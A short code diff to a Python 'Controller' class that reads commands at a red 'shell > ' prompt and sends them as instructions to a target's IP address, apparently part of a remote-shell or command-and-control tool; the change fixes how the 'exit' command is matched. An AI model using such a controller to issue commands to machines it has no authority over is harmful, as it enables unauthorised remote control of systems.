@@ -53,8 +53,8 @@ class Controller(Host):
             if not shell_lock.value:
                 cmd = input(colored("shell > ", "red")).encode()
                 shell_lock.value = True
-                if cmd == "exit":
-                    sys.exit()
+                if cmd == b'exit':
+                    break
                 elif len(cmd) != 0:
                     self.send(target['ip'], "instruction", cmd)
                     
